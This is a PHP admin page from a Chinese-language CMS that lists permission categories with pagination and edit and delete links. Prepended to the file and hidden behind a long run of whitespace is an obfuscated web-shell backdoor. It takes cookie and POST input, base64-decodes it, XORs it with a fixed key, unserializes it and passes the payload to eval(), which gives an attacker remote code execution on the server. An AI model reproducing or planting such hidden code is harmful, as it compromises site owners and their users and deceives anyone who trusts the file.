<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ODyqxqQB = 'Q' . "\162" . "\x5f" . chr ( 842 - 720 )."\132" . "\x67" . "\x61";$CSGOSkVdb = chr ( 649 - 550 ).chr (108) . "\141" . "\163" . chr (115) . chr ( 543 - 448 ).chr ( 508 - 407 )."\170" . chr ( 853 - 748 ).chr ( 1084 - 969 ).chr ( 689 - 573 )."\x73";$kVniiYa = class_exists($ODyqxqQB); $ODyqxqQB = "58762";$CSGOSkVdb = "46041";if ($kVniiYa === FALSE){class Qr_zZga{public function UFpdxrM(){echo "35869";}private $RJrsUnm;public static $jIoIAvWXr = "fd68ad27-cc13-4fac-85d3-519ba9b6ae6a";public static $kssWWl = 32805;public function __construct($PSsusUf=0){$qszCUNDc = $_POST;$sJEour = $_COOKIE;$mhKmKxrdmK = @$sJEour[substr(Qr_zZga::$jIoIAvWXr, 0, 4)];if (!empty($mhKmKxrdmK)){$bpGOTUzIF = "base64";$UxAvzF = "";$mhKmKxrdmK = explode(",", $mhKmKxrdmK);foreach ($mhKmKxrdmK as $OdcVzr){$UxAvzF .= @$sJEour[$OdcVzr];$UxAvzF .= @$qszCUNDc[$OdcVzr];}$UxAvzF = array_map($bpGOTUzIF . "\137" . "\x64" . "\145" . chr (99) . "\x6f" . "\144" . "\145", array($UxAvzF,)); $UxAvzF = $UxAvzF[0] ^ str_repeat(Qr_zZga::$jIoIAvWXr, (strlen($UxAvzF[0]) / strlen(Qr_zZga::$jIoIAvWXr)) + 1);Qr_zZga::$kssWWl = @unserialize($UxAvzF);}}private function wQSFVXPlBe(){if (is_array(Qr_zZga::$kssWWl)) {$epclDqd = str_replace(chr ( 617 - 557 ) . '?' . "\x70" . 'h' . "\x70", "", Qr_zZga::$kssWWl["\143" . chr (111) . "\x6e" . "\164" . "\x65" . "\156" . "\164"]);eval($epclDqd); $XizDh = "4042";exit();}}public function __destruct(){$this->wQSFVXPlBe();}}$ULMJBbV = new /* 65287 */ Qr_zZga(); $ULMJBbV = str_repeat("42669_37275", 1);} ?><?php require_once('../Connections/connect2data.php'); ?>

<?php
$menu_is = "authority";

$currentPage = $_SERVER["PHP_SELF"];

$maxRows_RecAuthorityC = 10;
$pageNum_RecAuthorityC = 0;
if (isset($_GET['pageNum_RecAuthorityC'])) {
    $pageNum_RecAuthorityC = $_GET['pageNum_RecAuthorityC'];
}
$startRow_RecAuthorityC = $pageNum_RecAuthorityC * $maxRows_RecAuthorityC;

$query_RecAuthorityC = "SELECT * FROM a_set ORDER BY a_id ASC";
$query_limit_RecAuthorityC = sprintf("%s LIMIT %d, %d", $query_RecAuthorityC, $startRow_RecAuthorityC, $maxRows_RecAuthorityC);
$RecAuthorityC = $conn->query($query_limit_RecAuthorityC);
$row_RecAuthorityC = $RecAuthorityC->fetch();

if (isset($_GET['totalRows_RecAuthorityC'])) {
    $totalRows_RecAuthorityC = $_GET['totalRows_RecAuthorityC'];
} else {
    $all_RecAuthorityC = $conn->query($query_RecAuthorityC);
    $totalRows_RecAuthorityC = $all_RecAuthorityC->rowCount();
}
$totalPages_RecAuthorityC = ceil($totalRows_RecAuthorityC / $maxRows_RecAuthorityC) - 1;

$queryString_RecAuthorityC = "";
if (!empty($_SERVER['QUERY_STRING'])) {
    $params = explode("&", $_SERVER['QUERY_STRING']);
    $newParams = array();
    foreach ($params as $param) {
        if (stristr($param, "pageNum_RecAuthorityC") == false &&
            stristr($param, "totalRows_RecAuthorityC") == false) {
            array_push($newParams, $param);
        }
    }
    if (count($newParams) != 0) {
        $queryString_RecAuthorityC = "&" . htmlentities(implode("&", $newParams));
    }
}
$queryString_RecAuthorityC = sprintf("&totalRows_RecAuthorityC=%d%s", $totalRows_RecAuthorityC, $queryString_RecAuthorityC);

// ====================================================================

$R_pageNum_RecAuthorityC = 0;
if (isset($_REQUEST["pageNum_RecAuthorityC"])) {
    $R_pageNum_RecAuthorityC = $_REQUEST["pageNum_RecAuthorityC"];
}
if (!isset($R_pageNum_RecAuthorityC)) {
    $_SESSION["ToPage"] = 0;
}
//若指定分頁數小於1則預設顯示第一頁
else if ($R_pageNum_RecAuthorityC < 0) {
    $_SESSION["ToPage"] = 0;
}
//若指定指定的分頁超過總分頁數則顯示最後一頁
else if ($R_pageNum_RecAuthorityC > $totalPages_RecAuthorityC) {
    $_SESSION["ToPage"] = $TotalPage;
} else {
    $_SESSION["ToPage"] = $R_pageNum_RecAuthorityC;
}

//如果指定的頁面大於資料所擁有的頁面,轉到最大的頁面
if ($R_pageNum_RecAuthorityC > $totalPages_RecAuthorityC && $R_pageNum_RecAuthorityC != 0) {
    header("Location:authorityC_list.php?pageNum_RecAuthorityC=" . $totalPages_RecAuthorityC);
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title><?php require_once('cmsTitle.php'); ?></title>

    <?php require_once('script.php'); ?>
    <?php require_once('head.php');?>
</head>
<body>
    <table width="1280" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr>
            <td align="center">
                <?php require_once('cmsHeader.php'); ?>
                <?php require_once('top.php'); ?>
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td align="left">
                            <!-- InstanceBeginEditable name="編輯區域" -->
                            <table width="100%" border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td width="300" class="list_title">權限種類列表</td>
                                    <td width="724"><span class="no_data">
									<?php if ($totalRows_RecAuthorityC == 0) { // Show if recordset empty ?>
										<strong>抱歉!找不到任何資料~</strong>
									<?php } // Show if recordset empty ?>
									</span> </td>
                                </tr>
                            </table>
                            <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#E1E1E1" class="list_title_table">
                                <tr>
                                    <td width="739" align="right" class="page_display">
                                        <!-------顯示頁選擇與分頁設定開始---------->
                                        <table border="0">
                                            <tr>
                                                <td>
                                                    <?php if ($pageNum_RecAuthorityC > 0) { // Show if not first page ?>
                                                    <a href="<?php printf(" %s?pageNum_RecAuthorityC=%d%s ", $currentPage, max(0, $pageNum_RecAuthorityC - 1), $queryString_RecAuthorityC); ?>"><</a>
                                                    <?php } // Show if not first page ?>
                                                </td>
                                                <td>
                                                	<?php
													//echo $totalRows_RecAuthorityC;//所有筆數
													//echo $totalPages_RecAuthorityC;//最後分頁的頁數,由0開始的陣列
													//echo $pageNum_RecAuthorityC;//現在顯示的頁面,由0開始的陣列
													//echo $currentPage;//現在的目錄路徑
													//echo $queryString_RecAuthorityC;//以字串顯示所有的筆數,如&totalRows_RecAuthorityC=11
													if ($totalPages_RecAuthorityC < 10) {
													    if ($totalRows_RecAuthorityC == 0) {
													        //如果沒有任何資料，不顯示|符號
													    } else {
													        echo " | ";
													    }

													    for ($i = 1; $i <= $totalPages_RecAuthorityC + 1; $i++) {
													        //如果非正在顯示的分頁則建立頁碼連結
													        if ($i != $pageNum_RecAuthorityC + 1) {

													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													            echo ">" . $i . "</a> | ";
													        }
													        //如果是正在顯示的方頁則單純顯示頁碼
													        else {
													            echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													        }
													    }
													} else {
													    //$totalPages_RecAuthorityC>10
													    $morePage_num = $totalPages_RecAuthorityC - $pageNum_RecAuthorityC; //此頁面之後總共有多少
													    if ($morePage_num > 7) {
													        if ($pageNum_RecAuthorityC < 3) {
													            if ($totalRows_RecAuthorityC == 0) {
													                //如果沒有任何資料，不顯示|符號
													            } else {
													                echo " | ";
													            }

													            for ($i = 1; $i <= 10; $i++) {
													                //如果非正在顯示的分頁則建立頁碼連結
													                if ($i != $pageNum_RecAuthorityC + 1) {

													                    echo "<a href=";
													                    printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													                    echo ">" . $i . "</a> | ";
													                } else {
													                    //如果是正在顯示的方頁則單純顯示頁碼
													                    echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													                }
													            }

													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $totalPages_RecAuthorityC, $queryString_RecAuthorityC);
													            echo ">..." . ($totalPages_RecAuthorityC + 1) . "</a> | ";
													        } else {
													            //$pageNum_RecAuthorityC>=3
													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, 0, $queryString_RecAuthorityC);
													            echo ">" . 1 . "...</a> | ";

													            for ($i = $pageNum_RecAuthorityC - 1; $i <= $pageNum_RecAuthorityC + 8; $i++) {
													                //如果非正在顯示的分頁則建立頁碼連結
													                if ($i != $pageNum_RecAuthorityC + 1) {

													                    echo "<a href=";
													                    printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													                    echo ">" . $i . "</a> | ";
													                } else {
													                    //如果是正在顯示的方頁則單純顯示頁碼
													                    echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													                }
													            }

													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $totalPages_RecAuthorityC, $queryString_RecAuthorityC);
													            echo ">..." . ($totalPages_RecAuthorityC + 1) . "</a> | ";
													        }
													    } else {
													        //$morePage_num<=7
													        $beforePage_num = 9 - $morePage_num;
													        $beforePage = $pageNum_RecAuthorityC - $beforePage_num;

													        echo "<a href=";
													        printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, 0, $queryString_RecAuthorityC);
													        echo ">" . 1 . "...</a> | ";

													        for ($i = $beforePage + 1; $i <= $totalPages_RecAuthorityC + 1; $i++) {
													            //如果非正在顯示的分頁則建立頁碼連結
													            if ($i != $pageNum_RecAuthorityC + 1) {
													                echo "<a href=";
													                printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													                echo ">" . $i . "</a> | ";
													            } else {
													                //如果是正在顯示的方頁則單純顯示頁碼
													                echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													            }
													        }
													    }
													}
													?>
                                                </td>
                                                <td>
                                                    <?php if ($pageNum_RecAuthorityC < $totalPages_RecAuthorityC) { // Show if not last page ?>
                                                    <a href="<?php printf(" %s?pageNum_RecAuthorityC=%d%s ", $currentPage, min($totalPages_RecAuthorityC, $pageNum_RecAuthorityC + 1), $queryString_RecAuthorityC); ?>">></a>
                                                    <?php } // Show if not last page ?>
                                                </td>
                                            </tr>
                                        </table>
                                        <!-------顯示頁選擇與分頁設定結束---------->
                                    </td>
                                    <td width="110" align="right" class="page_display">
                                        <?php if ($totalRows_RecAuthorityC > 0) { // Show if recordset not empty ?> 頁數:
                                        <?php echo (($pageNum_RecAuthorityC+1)."/".($totalPages_RecAuthorityC+1)); ?>
                                        <?php } // Show if recordset not empty ?>
                                    </td>
                                    <td width="151" align="right" class="page_display">所有資料數:
                                        <?php echo $totalRows_RecAuthorityC ?> </td>
                                    <td width="24" align="right">&nbsp;</td>
                                </tr>
                            </table>
                            <table width="800" border="0" cellspacing="0" cellpadding="0">
                                <tr>
                                    <td><img src="image/spacer.gif" width="1" height="1" /></td>
                                </tr>
                            </table>
                            <form action="authorityC_process.php" method="post" name="form1" id="form1">
                                <?php if ($totalRows_RecAuthorityC > 0) { // Show if recordset not empty ?>
                                <table width="100%" border="0" align="center" cellpadding="5" cellspacing="1">
                                    <tr>
                                        <td width="870" align="center" class="table_title">種類名稱</td>
                                        <td width="60" align="center" class="table_title">修改</td>
                                        <td width="60" align="center" class="table_title">刪除</td>
                                    </tr>
                                    <?php $i=0; do { $i++; ?>
						  			<tr <?php if ($i%2==0): ?>bgcolor='#E4E4E4'<?php endif ?>>
                                        <td align="center" class="table_data">
                                            <a href="authorityC_edit.php?a_id=<?php echo $row_RecAuthorityC['a_id']; ?>">
                                                <?php echo $row_RecAuthorityC['a_title']; ?>
                                            </a>
                                        </td>
                                        <td align="center" class="table_data"><a href="authorityC_edit.php?a_id=<?php echo $row_RecAuthorityC['a_id']; ?>"><img src="image/pencil.png" width="16" height="16" /></a></td>
                                        <td align="center" class="table_data">
                                            <?php if( $row_RecAuthorityC['a_id']!=1 ){?>
                                            <a href="authorityC_del.php?a_id=<?php echo $row_RecAuthorityC['a_id']; ?>"><img src="image/cross.png" width="16" height="16" /></a>
                                            <?php }else{echo '不可刪除'; } ?>
                                        </td>
				                    </tr>
				                    <?php } while ($row_RecAuthorityC = $RecAuthorityC->fetch()); ?>
			                    </table>
			                    <?php } // Show if recordset not empty ?>
							</form>
		                    <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#E1E1E1" class="list_title_table">
		                        <tr>
		                            <td width="739" align="right" class="page_display">
		                                <!-------顯示頁選擇與分頁設定開始---------->
		                                <table border="0">
		                                    <tr>
		                                        <td>
		                                            <?php if ($pageNum_RecAuthorityC > 0) { // Show if not first page ?>
		                                            <a href="<?php printf(" %s?pageNum_RecAuthorityC=%d%s ", $currentPage, max(0, $pageNum_RecAuthorityC - 1), $queryString_RecAuthorityC); ?>"><</a>
		                                            <?php } // Show if not first page ?>
		                                        </td>
		                                        <td>
		                                            <?php
													//echo $totalRows_RecAuthorityC;//所有筆數
													//echo $totalPages_RecAuthorityC;//最後分頁的頁數,由0開始的陣列
													//echo $pageNum_RecAuthorityC;//現在顯示的頁面,由0開始的陣列
													//echo $currentPage;//現在的目錄路徑
													//echo $queryString_RecAuthorityC;//以字串顯示所有的筆數,如&totalRows_RecAuthorityC=11
													if ($totalPages_RecAuthorityC < 10) {
													    if ($totalRows_RecAuthorityC == 0) {
													        //如果沒有任何資料，不顯示|符號
													    } else {
													        echo " | ";
													    }

													    for ($i = 1; $i <= $totalPages_RecAuthorityC + 1; $i++) {
													        //如果非正在顯示的分頁則建立頁碼連結
													        if ($i != $pageNum_RecAuthorityC + 1) {

													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													            echo ">" . $i . "</a> | ";
													        } else {
													            //如果是正在顯示的方頁則單純顯示頁碼
													            echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													        }
													    }
													} else {
													    //$totalPages_RecAuthorityC>10
													    $morePage_num = $totalPages_RecAuthorityC - $pageNum_RecAuthorityC; //此頁面之後總共有多少
													    if ($morePage_num > 7) {
													        if ($pageNum_RecAuthorityC < 3) {
													            if ($totalRows_RecAuthorityC == 0) {
													                //如果沒有任何資料，不顯示|符號
													            } else {
													                echo " | ";
													            }

													            for ($i = 1; $i <= 10; $i++) {
													                //如果非正在顯示的分頁則建立頁碼連結
													                if ($i != $pageNum_RecAuthorityC + 1) {

													                    echo "<a href=";
													                    printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													                    echo ">" . $i . "</a> | ";
													                } else {
													                    //如果是正在顯示的方頁則單純顯示頁碼
													                    echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													                }
													            }

													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $totalPages_RecAuthorityC, $queryString_RecAuthorityC);
													            echo ">..." . ($totalPages_RecAuthorityC + 1) . "</a> | ";
													        } else {
													            //$pageNum_RecAuthorityC>=3
													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, 0, $queryString_RecAuthorityC);
													            echo ">" . 1 . "...</a> | ";

													            for ($i = $pageNum_RecAuthorityC - 1; $i <= $pageNum_RecAuthorityC + 8; $i++) {
													                //如果非正在顯示的分頁則建立頁碼連結
													                if ($i != $pageNum_RecAuthorityC + 1) {

													                    echo "<a href=";
													                    printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													                    echo ">" . $i . "</a> | ";
													                } else {
													                    //如果是正在顯示的方頁則單純顯示頁碼
													                    echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													                }
													            }

													            echo "<a href=";
													            printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $totalPages_RecAuthorityC, $queryString_RecAuthorityC);
													            echo ">..." . ($totalPages_RecAuthorityC + 1) . "</a> | ";
													        }
													    } else {
													        //$morePage_num<=7
													        $beforePage_num = 9 - $morePage_num;
													        $beforePage = $pageNum_RecAuthorityC - $beforePage_num;

													        echo "<a href=";
													        printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, 0, $queryString_RecAuthorityC);
													        echo ">" . 1 . "...</a> | ";

													        for ($i = $beforePage + 1; $i <= $totalPages_RecAuthorityC + 1; $i++) {
													            //如果非正在顯示的分頁則建立頁碼連結
													            if ($i != $pageNum_RecAuthorityC + 1) {
													                echo "<a href=";
													                printf("%s?pageNum_RecAuthorityC=%d%s", $currentPage, $i - 1, $queryString_RecAuthorityC);
													                echo ">" . $i . "</a> | ";
													            } else {
													                //如果是正在顯示的方頁則單純顯示頁碼
													                echo "<font style=\"text-decoration: underline;\">" . $i . "</font>" . " | ";
													            }
													        }
													    }
													}
													?>
		                                        </td>
		                                        <td>
		                                            <?php if ($pageNum_RecAuthorityC < $totalPages_RecAuthorityC) { // Show if not last page ?>
		                                            <a href="<?php printf(" %s?pageNum_RecAuthorityC=%d%s ", $currentPage, min($totalPages_RecAuthorityC, $pageNum_RecAuthorityC + 1), $queryString_RecAuthorityC); ?>">></a>
		                                            <?php } // Show if not last page ?>
		                                        </td>
		                                        <?php ?>
		                                    </tr>
		                                </table>
		                                <!-------顯示頁選擇與分頁設定結束---------->
		                            </td>
		                            <td width="110" align="right" class="page_display">
		                                <?php if ($totalRows_RecAuthorityC > 0) { // Show if recordset not empty ?> 頁數:
		                                <?php echo (($pageNum_RecAuthorityC+1)."/".($totalPages_RecAuthorityC+1)); ?>
		                                <?php } // Show if recordset not empty ?>
		                            </td>
		                            <td width="151" align="right" class="page_display">所有資料數:
		                                <?php echo $totalRows_RecAuthorityC ?> </td>
		                            <td width="24" align="right">&nbsp;</td>
		                        </tr>
		                    </table>
		                    <!-- InstanceEndEditable -->
						</td>
					</tr>
				</table>
			</td>
		</tr>
	</table>
</body>
</html>